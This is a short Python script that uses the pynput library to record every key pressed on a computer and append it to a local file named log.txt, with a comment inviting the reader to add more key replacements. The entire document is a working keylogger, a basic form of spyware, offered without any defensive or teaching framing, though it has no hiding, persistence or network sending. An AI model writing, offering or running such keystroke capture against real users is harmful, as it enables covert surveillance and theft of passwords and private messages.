from pynput.keyboard import Listener


def writetolog(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == 'Key.space':
        keydata = ' '
    # You can add your own types of replacements like space for shift ,alt,ctrl etc..

    with open('log.txt', 'a') as f:
        f.write(keydata)


with Listener(on_press=writetolog) as lis:
    lis.join()
